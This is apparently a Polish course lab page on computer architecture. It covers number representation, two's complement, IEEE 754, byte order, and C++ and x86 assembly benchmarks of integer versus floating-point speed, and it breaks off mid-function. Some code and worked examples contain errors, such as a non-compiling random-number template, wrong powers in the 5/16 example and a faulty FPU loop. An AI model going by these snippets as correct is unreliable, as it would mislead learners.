---
title: "Lab"
date: 2023-04-24T17:13:33+02:00
draft: false
ShowToc: true
---

``` {=html}
<style>
body { min-width: 80% !important; }
</style>
```

Treści programowe
=================

Wykłady
-------
1. Podstawowe typy architektur i pojęcia z nimi związane.
2. Problemy w implementacji architektury potokowej i superskalarnej; metody ich rozwiązywania i wynikające z nich podukłady mikroprocesorów.
3. Charakterystyka architektury wybranych współczesnych procesorów wykorzystywanych w urządzeniach stacjonarnych, mobilnych oraz superkomputerach.
4. Komunikacja pomiędzy procesorem, pamięcią a urządzeniami wejścia/wyjścia.
5. Charakterystyka architektury wybranych komputerów stacjonarnych oraz urządzeń mobilnych.
6. Współczesne pamięci operacyjne / podstawowe parametry statyczne i dynamiczne.
7. Typy magistral i ich parametry.
8. Benchmarki.
9. Charakterystyka mikrokomputerów jednoukładowych i ich przeznaczenie.

Ćwiczenia
---------
1. Analiza szybkości wykonywania operacji stało- i zmiennoprzecinkowych.
2. Analiza cyklu rozkazowego i potoku rozkazowego w jednym rdzeniu procesora jedno i wielordzeniowego.
3. Komunikacja z pamięcią oraz z urządzeniami wejścia/wyjścia oraz obsługa przerwań.

4. Analiza działania wybranych instrukcji i przykładowych programów w asemblerze wybranego procesora.
5. Tworzenie przykładowych programów w asemblerze z wykorzystaniem instrukcji warunkowych i pętli.
6. Oprogramowanie układu sterującego dla przykładowego zadania (np. sterowanie światłami na
skrzyżowaniu, obsługą żądań przywołania windy itp.).


Wstęp
=====

W programowaniu w językach wysokiego poziomu, takich jak np. C++, istnieje kilka problemów związanych z architekturą procesora i organizacją systemu komputerowego. Oto niektóre z nich:

1. Reordering instrukcji: Procesory mogą zmieniać kolejność wykonywania instrukcji, aby zoptymalizować wydajność. Może to prowadzić do problemów związanych z synchronizacją wątków i niezdefiniowanym zachowaniem. Aby temu zapobiec, można użyć odpowiednich metod synchronizacji, takich jak muteksy, blokady czy bariery pamięci.

2. Efekty związane z pamięcią cache: Dostęp do pamięci ma istotny wpływ na wydajność programu. Wysokiej wydajności algorytmy powinny być zaprojektowane z uwzględnieniem hierarchii pamięci, tak aby minimalizować opóźnienia związane z odwołaniami do pamięci. Można to osiągnąć, stosując techniki optymalizacji, takie jak blokowanie, użycie pamięci lokalnej czy cache-oblivious algorithms.

3. Równoczesność i współbieżność: Wykorzystanie wielowątkowości i wielordzeniowości procesorów może prowadzić do problemów związanych z dostępem do wspólnych zasobów, takich jak dane czy urządzenia wejścia/wyjścia. Aby zapewnić poprawną współpracę wątków, można stosować mechanizmy synchronizacji (muteksy, semafory, blokady) oraz techniki programowania równoległego, takie jak zadania, przetwarzanie równoległe czy potoki.

4. Wydajność arytmetyki zmiennoprzecinkowej: Obliczenia zmiennoprzecinkowe różnią się wydajnością w zależności od architektury procesora. Aby uzyskać najlepszą wydajność, można stosować optymalizacje specyficzne dla danego procesora, takie jak wektoryzacja, instrukcje SIMD czy optymalizacja obliczeń matematycznych.

5. Obsługa błędów sprzętowych: Błędy sprzętowe, takie jak błędy parzystości czy uszkodzenia pamięci, mogą wpłynąć na poprawność działania programu. Można zastosować techniki wykrywania i naprawy błędów, takie jak korekcja błędów pamięci czy sprawdzanie parzystości, aby zminimalizować ryzyko wprowadzenia błędów przez sprzęt.

Aby uniknąć tych problemów i zapewnić poprawne działanie programu, ważne jest zapoznanie się z architekturą procesora, na którym ma być uruchomiony program, oraz zastosowanie odpowiednich technik programowania i optymalizacji. Oto kilka dodatkowych wskazówek:

6. Endianness: Kolejność bajtów w reprezentacji liczb wielobajtowych (little-endian lub big-endian) różni się między różnymi architekturami procesorów. 

7. Wydajność operacji wejścia/wyjścia: Operacje wejścia/wyjścia mają znaczący wpływ na wydajność aplikacji. W przypadku programów wymagających intensywnego przepływu danych, należy zastosować techniki buforowania, asynchronicznych operacji wejścia/wyjścia oraz optymalizować użycie systemów plików i urządzeń wejścia/wyjścia.

8. Granice stronicowania: Dostęp do pamięci może być niejednorodny z powodu granic stronicowania. Aby uniknąć opóźnień związanych z przenoszeniem danych między stronami pamięci, można zastosować techniki takie jak wyrównywanie stronicowania (page alignment), stosowanie dużych stron (huge pages) czy ograniczenie fragmentacji pamięci.

9. Architektura NUMA (Non-Uniform Memory Access): W przypadku systemów wieloprocesorowych z architekturą NUMA, dostęp do pamięci może być wolniejszy dla niektórych rdzeni procesora. Aby zoptymalizować wydajność programów na takich systemach, można stosować techniki takie jak lokalność danych, afinitet rdzeni czy specjalne funkcje alokacji pamięci, takie jak `numa_alloc_onnode` i `numa_bind`.

10. Wsparcie dla instrukcji specyficznych dla procesora: Niektóre procesory mają instrukcje, które pozwalają na bardziej efektywne wykonanie określonych operacji. Można skorzystać z tych instrukcji, pisząc kod w asemblerze lub korzystając z bibliotek, które wykorzystują te instrukcje, takie jak biblioteki matematyczne czy algorytmiczne.

Aby uniknąć problemów związanych z architekturą procesora i organizacją systemu komputerowego, ważne jest, aby programować z uwzględnieniem tych zagadnień. Dobrym podejściem jest też korzystanie z bibliotek i narzędzi, które już zostały zoptymalizowane pod kątem różnych architektur i systemów.


> Ref:
> - [Measuring Jitter and Latency](http://www.cs.ru.nl/lab/xenomai/exercises_xenomai2.4/ex10/Exercise-10.html)
> - [logic gate simulator](https://academo.org/demos/logic-gate-simulator/)
> - [WSL](https://learn.microsoft.com/en-gb/windows/wsl/install-manual#step-2---check-requirements-for-running-wsl-2) !!
> - VirtualBox
> - [Mingw-w64](https://www.mingw-w64.org/)
> - [The microarchitecture of Intel, AMD, and VIA CPUs](https://agner.org/optimize/microarchitecture.pdf)

> - Architektura systoliczna - np. Edge TPU
> - [Google Coral Edge TPU explained in depth](https://qengineering.eu/google-corals-tpu-explained.html)
> - Cell (PS3) - PowerPC (PPE) + 7 x „Synergistic Processing Elements” (SPEs) [PlayStation 3](https://pl.wikipedia.org/wiki/PlayStation_3)
> - [Hardware for Deep Learning](https://blog.inten.to/hardware-for-deep-learning-current-state-and-trends-51c01ebbb6dc)
> - [Unlocking the Secrets of GPU Architecture](https://tp4348.medium.com/multithreaded-programs-on-gpu-7ae4dfbb19d3)
> - [A CPU is a compiler](https://lobste.rs/s/okcml7/cpu_is_compiler)

# Reprezentacja liczb

### System dziesiętny

Liczba 13910 jest zapisana w systemie dziesiętnym, co oznacza, że każda pozycja odpowiada potędze liczby 10. System pozycyjny to sposób zapisu liczb, w którym wartość liczby zależy od wartości cyfr i ich pozycji. W systemie wagowym wartość liczby jest sumą iloczynów cyfr i wag pozycji, gdzie wagi pozycji są potęgami podstawy systemu.

Liczba 13910 z rozbiciem na wagi poszczególnych pozycji:

    1 * 10^4 + 
    3 * 10^3 + 
    9 * 10^2 + 
    1 * 10^1 + 
    0 * 10^0 =
    
    10000 + 3000 + 900 + 10 + 0 = 13910

### System binarny

Konwersja liczby 13910 na zapis binarny:

    13910 : 2 = 6955 (reszta: 0)
    6955  : 2 = 3477 (reszta: 1)
    3477  : 2 = 1738 (reszta: 1)
    1738  : 2 = 869  (reszta: 0)
    869   : 2 = 434  (reszta: 1)
    434   : 2 = 217  (reszta: 0)
    217   : 2 = 108  (reszta: 1)
    108   : 2 = 54   (reszta: 0)
    54    : 2 = 27   (reszta: 0)
    27    : 2 = 13   (reszta: 1)
    13    : 2 = 6    (reszta: 1)
    6     : 2 = 3    (reszta: 0)
    3     : 2 = 1    (reszta: 1)
    1     : 2 = 0    (reszta: 1)
    
    Liczba binarna: 11 0110 0101 0110

> Naturalny kod binarny to sposób zapisu liczb, w którym wartość liczby jest sumą iloczynów cyfr i wag pozycji, gdzie wagi pozycji są potęgami liczby 2.

Liczba 1011 0101 z rozbiciem na wagi poszczególnych pozycji:
   
    1 * 2^7 + 
    0 * 2^6 + 
    1 * 2^5 + 
    1 * 2^4 + 
    0 * 2^3 + 
    1 * 2^2 + 
    0 * 2^1 + 
    1 * 2^0 = 

    128 + 32 + 16 + 4 + 1 = 181


### System szesnastkowy

|   |      |   |      |
|---|------|---|------|
| 0 | 0000 | 8 | 1000 |  
| 1 | 0001 | 9 | 1001 |  
| 2 | 0010 | A | 1010 |  
| 3 | 0011 | B | 1011 |  
| 4 | 0100 | C | 1100 |  
| 5 | 0101 | D | 1101 |  
| 6 | 0110 | E | 1110 |  
| 7 | 0111 | F | 1111 | 

Aby przekonwertować liczbę binarną 1011011100101101 na szesnastkowy, można ją podzielić na grupy po 4 bity i przypisać im wartości szesnastkowe:

    1011 0111 0010 1101
       B    7    2    D

Liczba szesnastkowa: B72D


### Przechowywanie danych w komputerach

Dane w komputerze są przechowywane w postaci binarnej, czyli za pomocą bitów (0 i 1). System binarny został wybrany ze względu na prostotę realizacji elektronicznej (wysokie i niskie napięcie) oraz łatwość przetwarzania informacji.

Rejestr to mały obszar pamięci w procesorze, używany do przechowywania wartości, które są obecnie przetwarzane. Słowo to ciąg bitów, który odpowiada długości rejestru lub jednostki przetwarzania danych.

Załóżmy, że mamy rejestr 8-bitowy. Aby zapisać wartość 139 (10001011) w rejestrze, wystarczy ustawić bity na odpowiednie wartości:
10001011

Ile bitów jest potrzebnych na zapisanie liczby 139, 255, 269, 513?

    139: 8 bitów (10001011)
    255: 8 bitów (11111111)
    269: 9 bitów (100001101)
    513: 10 bitów (1000000001)

Liczba potrzebnych bitów do zapisania każdej z tych liczb zależy od ich wartości w postaci binarnej. Aby określić minimalną ilość bitów potrzebną do zapisania danej liczby, można zastosować funkcję logarytmu dwójkowego (lub log2), a następnie zaokrąglić wynik w górę do najbliższej liczby całkowitej.

```python
math.ceil( math.log2(269) )
```

### Nadmiar i niedomiar

1. Dodawanie:

        A = 127 (01111111)
        B = 4 (00000100)
        A + B = 131 (10000011)

2. Dodawanie:

        A = 139 (10001011)
        B = 147 (10010011)
        A + B = 286 (1 00010010) 
        efekt nadmiaru, wynik nie mieści się w 8-bitowym rejestrze.

W drugim przypadku mamy do czynienia z nadmiarem, co oznacza, że wynik przekracza maksymalną wartość, która może być przechowywana w 8-bitowym rejestrze (255).

3. Odejmowanie:

        A = 115 (01110011)
        B = 5 (00000101)
        C = A - B = 110 (01101110)

4. Odejmowanie:

        A = 129 (10000001)
        B = 167 (10100111)
        C = A - B = -38 (11011010)
        efekt niedomiaru, ponieważ wynik jest liczbą ujemną.

### Liczby ujemne

Aby zapisać liczbę -2 w 8-bitowym rejestrze, używamy kodu U2 (Uzupełnienie do 2):

    -2 = 11111110

Przykład dla liczby 10110101:
           
1. Jako liczba dodatnia: 

        1 * 2^7 + 
        0 * 2^6 + 
        1 * 2^5 + 
        1 * 2^4 + 
        0 * 2^3 + 
        1 * 2^2 + 
        0 * 2^1 + 
        1 * 2^0 = 

        128 + 32 + 16 + 4 + 1 = 181

2. Jako liczba ujemna (w kodzie U2): 

       ~1011 0101 + 1 = 
        0100 1010 + 1 = 0100 1011

        co daje: 64 + 8 + 2 + 1 = 75, 
        więc liczba to -75.

> Interpretacja liczby zależy od kontekstu. W przypadku liczb ujemnych często stosowany jest kod U2.

#### Kod U2

Uzupełnienie do 2, to metoda reprezentacji liczb całkowitych, zarówno dodatnich, jak i ujemnych, w systemie binarnym. W kodzie U2 liczby dodatnie są reprezentowane tak samo jak w naturalnym kodzie binarnym, natomiast liczby ujemne są reprezentowane jako dopełnienie do 2 liczby bezwzględnej.

Obliczanie reprezentację liczby ujemnej w kodzie U2:
1. Przekształć wartość bezwzględną liczby ujemnej na postać binarną.
2. Odwróć bity (zmień 0 na 1 i 1 na 0).
3. Dodaj 1 do wyniku.

Przykłady:

1. Przykład dla liczby -3:

       1. Wartość bezwzględna: 3 (w binarnym: 0000 0011)
       2. Odwrócenie bitów: 1111 1100
       3. Dodanie 1: 1111 1100 + 1 = 1111 1101

       Kod U2 dla liczby -3: 1111 1101

2. Przykład dla liczby -7:

       1. Wartość bezwzględna: 7 (w binarnym: 0000 0111)
       2. Odwrócenie bitów: 1111 1000
       3. Dodanie 1: 1111 1000 + 1 = 1111 1001

       Kod U2 dla liczby -7: 1111 1001

> Kod U2 jest często stosowany w komputerach, ponieważ pozwala na wykonywanie operacji dodawania i odejmowania przy użyciu tego samego sprzętu, niezależnie od znaku liczb.

### Liczby rzeczywiste

    11 i 5/16 = 11.3125

Liczba 11 w postaci binarnej to 1011.

5/16 jako ułamek binarny to 0.0101 ponieważ 

     1 * (1/2)^3 + 
     0 * (1/2)^4 + 
     1 * (1/2)^5)

    0.3125 * 2 = 0.625 -> 0
    0.625  * 2 = 1.25  -> 1
    0.25   * 2 = 0.5   -> 0
    0.5    * 2 = 1     -> 1

Liczba 11 i 5/16 w postaci binarnej to: 1011.0101

Potrzebujemy 8 bitów na zapisanie tej liczby. Można zapisać ją w rejestrze jako liczba stałoprzecinkowa (zakładając, że przecinek jest zawsze pomiędzy bitami 3 i 4) lub używając notacji zmiennoprzecinkowej, która pozwala na zapisanie liczby z określoną precyzją i zakresem.


#### Zamiana na postać binarną

Aby przekształcić liczbę dziesiętną 10.75 na liczbę binarną, należy przekształcić osobno jej część całkowitą i część ułamkową.

1. Konwersja części całkowitej:
   
        Liczba całkowita: 10
        Postępujemy według metody dzielenia przez 2:

        10 / 2 = 5, reszta: 0
        5 / 2 = 2, reszta: 1
        2 / 2 = 1, reszta: 0
        1 / 2 = 0, reszta: 1

        Czytamy reszty od dołu do góry: 1010

2. Konwersja części ułamkowej:
   
        Liczba ułamkowa: 0.75
        Postępujemy według metody mnożenia przez 2:
        0.75 * 2 = 1.5 (zapisujemy cyfrę 1)
        0.5 * 2 = 1.0 (zapisujemy cyfrę 1)

        Czytam od góry do dołu: 11

Teraz, aby uzyskać postać binarną liczby 10.75, łączymy część całkowitą (1010) i część ułamkową (11) za pomocą przecinka binarnego: 1010.11

Stąd wynika, że liczba dziesiętna 10.75 jest równa liczbie binarnej 1010.11

> Uwaga
> Podczas konwersji liczby ułamkowej dziesiętnej na liczbę binarną za pomocą metody mnożenia przez 2, należy zakończyć mnożenie w jednym z następujących przypadków:
> 
> 1. Gdy wartość ułamkowa po mnożeniu wynosi dokładnie 0. Wtedy wszystkie kolejne mnożenia również będą dawały 0, a kolejne cyfry binarne po przecinku będą się składały wyłącznie z zer. W takiej sytuacji nie > ma potrzeby kontynuować obliczeń.
> 
> 2. Gdy osiągniesz żądaną precyzję. W praktyce, liczby binarne używane w komputerach mają ograniczoną precyzję (np. w przypadku liczb zmiennoprzecinkowych w standardzie IEEE 754). W związku z tym możemy > zakończyć mnożenie po osiągnięciu określonej liczby cyfr binarnych po przecinku.
> 
> 3. Gdy zauważysz cykliczne powtarzanie się wzoru cyfr. W niektórych przypadkach, liczby ułamkowe dziesiętne mają nieskończoną reprezentację binarną, która powtarza się cyklicznie. Kiedy zauważysz taki wzór, > możesz zakończyć mnożenie i zaokrąglić wynik do żądanej precyzji.
> 
> Należy pamiętać, że niektóre liczby ułamkowe dziesiętne mają nieskończoną reprezentację binarną, która nie wykazuje cyklicznego powtarzania się wzoru. W takich przypadkach, można zakończyć mnożenie, gdy > osiągnięta zostanie żądana precyzja, biorąc pod uwagę ograniczenia sprzętowe lub wymagania dotyczące zaokrąglenia.

#### Przykłady

1. Liczba dziesiętna 0.5:

        0.5 * 2 = 1.0 (zapisujemy cyfrę 1)
        Binarnie: 0.1

2. Liczba dziesiętna 0.25:

        0.25 * 2 = 0.5 (zapisujemy cyfrę 0)
        0.5 * 2 = 1.0 (zapisujemy cyfrę 1)
        Binarnie: 0.01

3. Liczba dziesiętna 0.625:

        0.625 * 2 = 1.25 (zapisujemy cyfrę 1)
        0.25 * 2 = 0.5 (zapisujemy cyfrę 0)
        0.5 * 2 = 1.0 (zapisujemy cyfrę 1)
        Binarnie: 0.101

4. Liczba dziesiętna 0.375:

        0.375 * 2 = 0.75 (zapisujemy cyfrę 0)
        0.75 * 2 = 1.5 (zapisujemy cyfrę 1)
        0.5 * 2 = 1.0 (zapisujemy cyfrę 1)
        Binarnie: 0.011

5. Liczba dziesiętna 0.1977:

        0.1977 * 2 = 0.3954 -> (0.0)
        0.3954 * 2 = 0.7908 -> (0.00)
        0.7908 * 2 = 1.5816 -> (0.001)
        0.5816 * 2 = 1.1632 -> (0.0011)
        0.1632 * 2 = 0.3264 -> (0.00110)
        0.3264 * 2 = 0.6528 -> (0.001100)
        0.6528 * 2 = 1.3056 -> (0.0011001)

>Warto zauważyć, że niektóre liczby ułamkowe w systemie dziesiętnym nie mają dokładnej reprezentacji w systemie binarnym.

6. Liczba dziesiętna 0.1:

        0.1 * 2 = 0.2 (zapisujemy cyfrę 0)
        0.2 * 2 = 0.4 (zapisujemy cyfrę 0)
        0.4 * 2 = 0.8 (zapisujemy cyfrę 0)
        0.8 * 2 = 1.6 (zapisujemy cyfrę 1)
        0.6 * 2 = 1.2 (zapisujemy cyfrę 1)
        0.2 * 2 = 0.4 (zapisujemy cyfrę 0)
        ...
        Binarnie: 0.0001100110011... (cyfry się powtarzają)

W takich przypadkach reprezentacja binarna będzie nieskończoną liczbą cyfr po przecinku i musi zostać zaokrąglona, aby zmieścić się w określonym formacie, takim jak standard IEEE 754.

#### Notacja zmiennoprzecinkowa

W komputerach najczęściej stosowaną notacją zmiennoprzecinkową jest standard IEEE 754. Standard ten definiuje formaty reprezentacji liczb zmiennoprzecinkowych, takie jak pojedyncza precyzja (32 bity) i podwójna precyzja (64 bity). Standard IEEE 754 pozwala na zapisanie liczb z określoną precyzją, zakresem i specjalnymi wartościami (takimi jak nieskończoność i NaN). Na niektórych platformach dostępny jest typ half-float (NVidia CUDA) o połowicznej precyzji (16 bitów)

Reprezentacja liczby zmiennoprzecinkowej w standardzie IEEE 754 składa się z trzech części:
1. Znak (Sign) - jeden bit, który reprezentuje znak liczby (0 - dodatnia, 1 - ujemna).
2. Wykładnik (Exponent) - ciąg bitów reprezentujący wykładnik liczby, przesunięty o wartość stałą (bias). Dla formatu pojedynczej precyzji przesunięcie wynosi 127, a dla podwójnej precyzji wynosi 1023.
3. Mantysa (Significand) - ciąg bitów reprezentujący wartość liczby znormalizowanej, ale bez pierwszego bitu (1), który jest zawsze niejawny (chyba że liczba jest denormalizowana).


![IEEE 754](images/IEEE754.png)

Tworzenie reprezentacji binarnej liczby zmiennoprzecinkowej w standardzie IEEE-754:

1. Określ znak liczby (0 dla dodatniej, 1 dla ujemnej).
2. Zamienić część dziesiętną oraz ułamkową na postać binarną.
2. Przekształć liczbę na postać znormalizowaną w notacji naukowej (1.x * 2^n).
3. Oblicz wykładnik, dodając przesunięcie (bias) do n (wykładnik notacji naukowej).
4. Przekształć mantysę na postać binarną, pomijając pierwszy bit (1).
5. Złożyć reprezentację z części znakowej, wykładnika i mantysy.

Przykład:

Chcemy zapisać liczbę 10.75 jako liczbę zmiennoprzecinkową w standardzie IEEE 754 (pojedyncza precyzja).

1. Liczba jest dodatnia, więc znak to 0.
2. Postać binarną: 10.75 = 1010.11
2. Postać znormalizowana: 1.01011 * 2^3
3. Wykładnik: 3 + 127 (bias) = 130, w postaci binarnej: 10000010
4. Mantysa (bez pierwszego bitu): 0101100... (w sumie 23 bity)
5. Składamy reprezentację: 0 10000010 01011000000000000000000

Reprezentacja liczby 10.75 w standardzie IEEE 754 (pojedyncza precyzja) to:


    32  31  30  29  28  27  26  25  24  23  22  21  20  19  18  17  16  15  14  13  12  11  10  9   8   7   6   5   4   3   2   1
    0   1   0   0   0   0   0   1   0   0   1   0   1   1   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0

    1 * 2^3 * 1.34375 = 10.75

> Ref: 
> - [http://www.cburch.com/books/float/](http://www.cburch.com/books/float/)
> - [Float Toy](http://evanw.github.io/float-toy/)
> - [What Every Computer Scientist Should Know About Floating-Point Arithmetic](https://docs.oracle.com/cd/E19957-01/800-7895/800-7895.pdf) 

# Kolejność bajtów

Przykład reprezentacji liczby 32-bitowej (4-bajtowej) w różnych kolejnościach bajtów:

Wartość: 0x12345678

- Little-endian: 78 56 34 12
- Big-endian: 12 34 56 78

Poniżej znajduje się przykładowy program w C++, który demonstruje różne kolejności bajtów:

```cpp
#include <iostream>
#include <cstdint>

union EndianTest {
    uint32_t i;
    uint8_t c[4];
};

int main() {
    EndianTest test;
    test.i = 0x12345678;

    std::cout << "System ma następującą kolejność bajtów: ";
    if (test.c[0] == 0x78 && test.c[1] == 0x56 && test.c[2] == 0x34 && test.c[3] == 0x12) {
        std::cout << "Little-endian" << std::endl;
    } else if (test.c[0] == 0x12 && test.c[1] == 0x34 && test.c[2] == 0x56 && test.c[3] == 0x78) {
        std::cout << "Big-endian" << std::endl;
    } else {
        std::cout << "Nieznana" << std::endl;
    }

    return 0;
}
```

Różne procesory używają różnych kolejności bajtów:

- Little-endian: Procesory Intel x86, x86-64 oraz większość mikrokontrolerów ARM (w trybie little-endian).
- Big-endian: Procesory Motorola 68k, PowerPC, IBM z/Architecture, a także niektóre mikrokontrolery ARM (w trybie big-endian).

Wybór kolejności bajtów jest często wynikiem decyzji projektowych, które miały na celu ułatwienie lub optymalizację wykonywania określonych operacji. Little-endian jest popularne ze względu na prostotę dodawania i odejmowania liczb o zmiennej długości oraz łatwiejszą obsługę liczb o mniejszej precyzji w reprezentacji o większej precyzji. Big-endian jest częściej stosowany w systemach, które muszą współpracować z sieciami komputerowymi, gdzie bajty są przesyłane od najbardziej znaczącego do najmniej znaczącego, co ułatwia interpretację wartości przesyłanych danych.

> Ref:
> - [Jak to jest z tym little-endian](https://blog.fabrykowski.pl/little-endian.html)

# Wykonywania operacji stało- i zmiennoprzecinkowych:

FPU (Floating Point Unit) to podzespoły procesora odpowiedzialne za wykonywanie operacji arytmetycznych na liczbach zmiennoprzecinkowych. Liczba jednostek FPU może się różnić w zależności od architektury i modelu procesora. Oto kilka przykładów:

1. Intel Core i7-8700K (8. generacja Core)
- 6 rdzeni, każdy z jednostką FPU, więc łącznie 6 jednostek FPU.

2. AMD Ryzen 7 3700X (3. generacja Ryzen)
- 8 rdzeni, każdy z jednostką FPU, więc łącznie 8 jednostek FPU.

3. Apple M1 (ARM-based)
- 8 rdzeni CPU (4 wysokiej wydajności i 4 energooszczędne), każdy z jednostką FPU, więc łącznie 8 jednostek FPU.

4. IBM POWER9
- 12 lub 24 rdzenie, w zależności od konfiguracji. Każdy rdzeń ma jedną jednostkę FPU, więc łącznie 12 lub 24 jednostki FPU.

5. NVIDIA A100 (GPU)
- W przypadku GPU, jednostki FPU są zintegrowane z procesorami strumieniowymi (CUDA cores). NVIDIA A100 posiada 6912 rdzeni CUDA, więc można uznać, że ma 6912 jednostek FPU.

Warto zauważyć, że w przypadku GPU, jednostki FPU mogą być wykorzystywane do obliczeń równoległych, ale zwykle nie są one traktowane jako oddzielne jednostki, tak jak w przypadku CPU.


## Porównanie czasu wykonywania

Porównanie czasu wykonywania dodawania, odejmowania, mnożenia i dzielenia dla liczby stałoprzecinkowej (int) i zmiennoprzecinkowej (float, double).

1. Utwórz program, który generuje losowe liczby int oraz float (lub double) i wykonuje podstawowe operacje matematyczne.
2. Zmierz czas wykonania każdej operacji za pomocą biblioteki <chrono>.
3. Wyświetl wyniki w formie tabeli, porównując czas wykonania operacji dla liczby stało- i zmiennoprzecinkowej.


Program realizujący opisane zadanie:

```cpp
#include <iostream>
#include <iomanip>
#include <chrono>
#include <random>

using namespace std;
using namespace std::chrono;

// Funkcja do generowania losowych liczb
template <typename T>
T generateRandomNumber(T min, T max) {
    static random_device rd;
    static mt19937 gen(rd());
    uniform_real_distribution<T> dist(min, max);
    return dist(gen);
}

// Główna funkcja
int main() {
    const int iterations = 1000000;

    // Generowanie losowych liczb
    int int1 = generateRandomNumber<int>(1, 1000);
    int int2 = generateRandomNumber<int>(1, 1000);
    float float1 = generateRandomNumber<float>(1.0, 1000.0);
    float float2 = generateRandomNumber<float>(1.0, 1000.0);
    double double1 = generateRandomNumber<double>(1.0, 1000.0);
    double double2 = generateRandomNumber<double>(1.0, 1000.0);

    // Pomiar czasu dla operacji na liczbach stałoprzecinkowych (int)
    auto int_start = high_resolution_clock::now();
    for (int i = 0; i < iterations; i++) {
        int a = int1 + int2;
        int b = int1 - int2;
        int c = int1 * int2;
        int d = int1 / int2;
    }
    auto int_end = high_resolution_clock::now();
    auto int_duration = duration_cast<nanoseconds>(int_end - int_start).count();

    // Pomiar czasu dla operacji na liczbach zmiennoprzecinkowych (float)
    auto float_start = high_resolution_clock::now();
    for (int i = 0; i < iterations; i++) {
        float a = float1 + float2;
        float b = float1 - float2;
        float c = float1 * float2;
        float d = float1 / float2;
    }
    auto float_end = high_resolution_clock::now();
    auto float_duration = duration_cast<nanoseconds>(float_end - float_start).count();

    // Pomiar czasu dla operacji na liczbach zmiennoprzecinkowych (double)
    auto double_start = high_resolution_clock::now();
    for (int i = 0; i < iterations; i++) {
        double a = double1 + double2;
        double b = double1 - double2;
        double c = double1 * double2;
        double d = double1 / double2;
    }
    auto double_end = high_resolution_clock::now();
    auto double_duration = duration_cast<nanoseconds>(double_end - double_start).count();

    // Wyświetlanie wyników
    cout << "Porównanie czasu wykonania operacji matematycznych (w nanosekundach) dla liczby stało- i zmiennoprzecinkowej" << endl;
    cout << setw(10) << "Typ" << setw(15) << "Czas" << endl;
    cout << setw(10) << "int" << setw(15) << int_duration << endl;
    cout << setw(10) << "float" << setw(15) << float_duration << endl;
    cout << setw(10) << "double" << setw(15) << double_duration << endl;

    return 0;
}
```


Poniżej znajduje się przykład programu napisanego w asemblerze x86, który porównuje czas wykonania operacji dodawania, odejmowania, mnożenia i dzielenia dla liczby stałoprzecinkowej (int) i zmiennoprzecinkowej (float, double). Program korzysta z polecenia RDTSC do mierzenia czasu wykonania operacji.

``` asm
section .data
iterations dd 1000000

; Stałe dla liczb stałoprzecinkowych
int1 dd 123
int2 dd 456

; Stałe dla liczb zmiennoprzecinkowych
float1 dd 123.456
float2 dd 456.789

section .bss
; Rezerwacja miejsca na zmienne
int_duration resd 1
float_duration resd 1

section .text
global _start

_start:

    ; Licznik pętli dla liczby stałoprzecinkowej (int)
    mov ecx, [iterations]

    ; Pobranie czasu startowego
    rdtsc
    mov edi, eax

int_loop:
    ; Dodawanie
    add eax, ebx

    ; Odejmowanie
    sub eax, ebx

    ; Mnożenie
    imul eax, ebx

    ; Dzielenie
    xor edx, edx
    idiv ebx

    ; Następna iteracja
    loop int_loop

    ; Pobranie czasu końcowego
    rdtsc
    sub eax, edi
    mov [int_duration], eax

    ; Licznik pętli dla liczby zmiennoprzecinkowej (float)
    mov ecx, [iterations]

    ; Pobranie czasu startowego
    rdtsc
    mov edi, eax

float_loop:
    ; Wczytanie liczb zmiennoprzecinkowych do rejestrów
    fld [float1]
    fld [float2]

    ; Dodawanie
    faddp st1, st0

    ; Odejmowanie
    fsubp st1, st0

    ; Mnożenie
    fmulp st1, st0

    ; Dzielenie
    fdivp st1, st0

    ; Następna iteracja
    loop float_loop

    ; Pobranie czasu końcowego
    rdtsc
    sub eax, edi
    mov [float_duration], eax

    ; Zakończenie programu
    mov eax, 1
    xor ebx, ebx
    int 0x80
```

Aby skompilować i uruchomić program, można użyć narzędzi NASM i LD lub fasm

```
fastasm itd.
```

Należy pamiętać, że ten program nie wypisuje wyników na ekran, ale przechowuje je w zarezerwowanych zmiennych `int_duration` i `float_duration`. Aby wyświetlić wyniki, można dodać kod odpowiedzialny za wypisanie wartości na ekran, korzystając z systemu wywołań (syscalls) lub użyć debuggera, aby przejrzeć wartości tych zmiennych

> Ref:
> - [x64dbg](https://x64dbg.com/)

## Analiza wpływu precyzji zmiennoprzecinkowej na czas wykonywania operacji.

1. Utwórz program, który wykonuje operacje matematyczne na liczbach zmiennoprzecinkowych o różnych precyzjach (float, double, long double).
2. Zmierz czas wykonania każdej operacji dla różnych precyzji.
3. Porównaj wyniki i zastanów się nad wpływem precyzji na czas wykonania operacji.

```cpp
#include <iostream>
#include <chrono>
#include <cmath>

using namespace std;
using namespace std::chrono;

const int iterations = 1000000;

template <typename T>
void perform_math_operations(const string &type_name) {
    T a = static_cast<T>(123.456);
    T b = static_cast<T>(456.789);
    T result;

    auto start_time = high_resolution_clock::now();

    for (int i = 0; i < iterations; ++i) {
        result = a + b;
        result = a - b;
        result = a * b;
        result = a / b;
    }

    auto end_time = high_resolution_clock::now();
    auto duration = duration_cast<microseconds>(end_time - start_time).count();

    cout << "Czas wykonania operacji dla typu " << type_name << ": " << duration << " mikrosekund" << endl;
}

int main() {
    perform_math_operations<float>("float");
    perform_math_operations<double>("double");
    perform_math_operations<long double>("long double");

    cout << "Wyniki mogą się różnić w zależności od sprzętu i kompilatora." << endl;
    cout << "Analizuj różnice między precyzjami i zastanów się nad wpływem precyzji na czas wykonania operacji." << endl;

    return 0;
}
```

Ten program w C++ analizuje wpływ precyzji zmiennoprzecinkowej na czas wykonania operacji. Wykonuje on podstawowe operacje matematyczne (`+`, `-`, `*`, `/`) na liczbach zmiennoprzecinkowych o różnych precyzjach (`float`, `double`, `long double`) i mierzy czas wykonania tych operacji za pomocą biblioteki `<chrono>`.

Po skompilowaniu i uruchomieniu programu, na konsoli zostaną wyświetlone wyniki czasu wykonania operacji dla różnych precyzji. Należy przeanalizować wyniki i zastanowić się nad wpływem precyzji na czas wykonania operacji.

## Obliczanie czasu wykonywania operacji na macierzach stało- i zmiennoprzecinkowych.

1. Napisz program, który mnoży dwie macierze o ustalonych rozmiarach, używając typów stałoprzecinkowych (int) oraz zmiennoprzecinkowych (float, double).
2. Zmierz czas wykonania mnożenia macierzy dla różnych rozmiarów macierzy.
3. Porównaj wyniki i omów znaczenie różnic w czasie wykonania dla różnych typów danych.

```cpp
#include <iostream>
#include <chrono>
#include <vector>

using namespace std;
using namespace std::chrono;

template <typename T>
void multiply_matrices(const vector<vector<T>> &matrix1, const vector<vector<T>> &matrix2, vector<vector<T>> &result) {
    size_t rows = matrix1.size();
    size_t cols = matrix2[0].size();
